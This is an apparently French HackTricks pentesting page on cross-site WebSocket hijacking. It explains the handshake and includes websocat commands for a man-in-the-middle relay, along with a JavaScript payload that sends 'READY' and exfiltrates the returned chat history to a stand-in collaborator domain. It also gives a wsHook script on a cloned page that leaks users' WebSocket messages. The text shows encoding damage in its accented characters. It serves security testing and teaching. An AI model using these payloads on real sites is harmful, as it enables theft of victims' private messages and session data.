# Cross-site WebSocket hijacking (CSWSH)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de cybers√©curit√© ? Voulez-vous voir votre entreprise annonc√©e dans HackTricks ? ou voulez-vous avoir acc√®s √† la derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Qu'est-ce que les WebSockets

Les connexions WebSocket sont initi√©es via **HTTP** et sont g√©n√©ralement **de longue dur√©e**. Les messages peuvent √™tre envoy√©s dans **les deux sens √† tout moment** et ne sont pas transactionnels. La connexion restera normalement ouverte et inactive jusqu'√† ce que le client ou le serveur soit pr√™t √† envoyer un message.\
Les WebSockets sont particuli√®rement utiles dans les situations o√π des messages √† **faible latence ou initi√©s par le serveur** sont n√©cessaires, comme les flux de donn√©es financi√®res en temps r√©el.

## Comment les connexions WebSocket sont-elles √©tablies ?

(Ici, vous trouverez un r√©sum√©, mais un **guide plus d√©taill√© sur la fa√ßon dont une connexion WebSocket** est cr√©√©e peut √™tre trouv√© [**ici**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)).\
Les connexions WebSocket sont normalement cr√©√©es √† l'aide de JavaScript c√¥t√© client comme suit :
```javascript
var ws = new WebSocket("wss://normal-website.com/chat");
```
Le protocole **`wss`** √©tablit une connexion WebSocket sur une connexion **TLS** chiffr√©e, tandis que le protocole **`ws`** utilise une connexion **non chiffr√©e**.

Pour √©tablir la connexion, le navigateur et le serveur effectuent une poign√©e de main WebSocket sur HTTP. Le navigateur √©met une demande de poign√©e de main WebSocket comme suit:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Si le serveur accepte la connexion, il renvoie une r√©ponse de poign√©e de main WebSocket comme suit:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
√Ä ce stade, la connexion r√©seau reste ouverte et peut √™tre utilis√©e pour envoyer des messages WebSocket dans les deux sens.

**Remarque**

Plusieurs **caract√©ristiques** des messages de **poign√©e de main** WebSocket m√©ritent d'√™tre not√©es :

* Les en-t√™tes **`Connection`** et **`Upgrade`** dans la demande et la r√©ponse **indiquent** qu'il s'agit d'une **poign√©e de main WebSocket**.
* L'en-t√™te de demande **`Sec-WebSocket-Version`** sp√©cifie la **version du protocole WebSocket** que le client souhaite utiliser. C'est g√©n√©ralement `13`.
* L'en-t√™te de demande **`Sec-WebSocket-Key`** contient une **valeur al√©atoire** encod√©e en Base64, qui doit √™tre g√©n√©r√©e de mani√®re al√©atoire dans chaque demande de poign√©e de main.
* L'en-t√™te de r√©ponse **`Sec-WebSocket-Accept`** contient un hachage de la valeur soumise dans l'en-t√™te de demande `Sec-WebSocket-Key`, concat√©n√©e avec une cha√Æne sp√©cifique d√©finie dans la sp√©cification du protocole. Cela est fait pour √©viter les r√©ponses trompeuses r√©sultant de serveurs mal configur√©s ou de caches proxy.

L'en-t√™te **`Sec-WebSocket-Key`** contient une **valeur al√©atoire** pour √©viter les erreurs des caches proxy, et **n'est pas utilis√© √† des fins d'authentification ou de gestion de session** (_Ce n'est pas un jeton CSRF_).

### Console Linux

Vous pouvez utiliser `websocat` pour √©tablir une connexion brute avec un websocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Ou pour cr√©er un serveur websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
## Connexions websocket MitM

Si vous constatez que des clients sont connect√©s √† un **websocket HTTP** depuis votre r√©seau local actuel, vous pouvez essayer une [attaque ARP Spoofing](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) pour effectuer une attaque MitM entre le client et le serveur.\
Une fois que le client essaie de se connecter, vous pouvez alors utiliser:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
## √ânum√©ration des Websockets

Vous pouvez utiliser l'**outil** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **pour d√©couvrir, identifier et rechercher automatiquement les** **vuln√©rabilit√©s** **connues** dans les websockets.

## Piratage de WebSocket entre sites (CSWSH)

√âgalement connu sous le nom de _piratage de WebSocket entre origines crois√©es_.\
**Il s'agit d'une** [**falsification de requ√™te entre sites (CSRF)**](csrf-cross-site-request-forgery.md) **sur une poign√©e de main WebSocket.**

Cela se produit lorsque la demande de **poign√©e de main WebSocket** repose uniquement sur les **cookies HTTP** pour la gestion de session et ne contient **aucun jeton CSRF** ou autre valeur impr√©visible.\
Un attaquant peut cr√©er une **page web malveillante** sur son propre domaine qui **√©tablit une connexion WebSocket entre sites** avec l'application vuln√©rable. L'application g√©rera la connexion dans le **contexte de la session de l'utilisateur victime** avec l'application.

### Attaque simple

Notez que lors de l'**√©tablissement** d'une **connexion websocket**, le **cookie** est **envoy√©** au serveur. Le **serveur** peut l'utiliser pour **relier** chaque **utilisateur sp√©cifique** √† sa **session websocket bas√©e sur le cookie envoy√©**.

Ensuite, si par **exemple** le **serveur websocket renvoie l'historique de la conversation** d'un utilisateur si un message avec "**READY**" est envoy√©, alors un **simple XSS** √©tablissant la connexion (le **cookie** sera **envoy√© automatiquement** pour autoriser l'utilisateur victime) **envoyant** "**READY**" sera capable de **r√©cup√©rer** l'historique de la **conversation**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
  //Exfiltrate the confidential information to attackers server
  fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie avec un sous-domaine diff√©rent

Dans ce billet de blog [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/), l'attaquant a r√©ussi √† **ex√©cuter du Javascript arbitraire dans un sous-domaine** du domaine o√π la communication websocket avait lieu. √âtant donn√© que c'√©tait un **sous-domaine**, le **cookie** √©tait envoy√©, et parce que le **Websocket ne v√©rifiait pas correctement l'origine**, il √©tait possible de communiquer avec lui et de **voler des jetons**.

### Vol de donn√©es utilisateur

Copiez l'application web que vous souhaitez usurper (par exemple les fichiers .html) et ajoutez ce code √† l'int√©rieur du script o√π la communication websocket a lieu:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
    var xhttp = new XMLHttpRequest();
    xhttp.open("GET", "client_msg?m="+data, true);
    xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
    var xhttp = new XMLHttpRequest();
    xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
    xhttp.send();
    return messageEvent;
}
```
Maintenant, t√©l√©chargez le fichier `wsHook.js` depuis [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) et **enregistrez-le dans le dossier contenant les fichiers web**.\
En exposant l'application web et en faisant connecter un utilisateur √† celle-ci, vous pourrez voler les messages envoy√©s et re√ßus via websocket :
```javascript
sudo python3 -m http.server 80
```
## Autres vuln√©rabilit√©s

Comme les Web Sockets sont un m√©canisme pour **envoyer des donn√©es c√¥t√© serveur et c√¥t√© client**, en fonction de la fa√ßon dont le serveur et le client g√®rent les informations, **les Web Sockets peuvent √™tre utilis√©s pour exploiter plusieurs autres vuln√©rabilit√©s telles que XSS, SQLi ou toute autre vuln√©rabilit√© web courante en utilisant l'entr√©e d'un utilisateur √† partir d'un websocket.**

## **WebSocket Smuggling**

Cette vuln√©rabilit√© pourrait vous permettre de **contourner les restrictions des proxies inverses** en leur faisant croire qu'une **communication websocket a √©t√© √©tablie** (m√™me si ce n'est pas vrai). Cela pourrait permettre √† un attaquant d'**acc√©der √† des points de terminaison cach√©s**. Pour plus d'informations, consultez la page suivante :

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## R√©f√©rences

{% embed url="https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
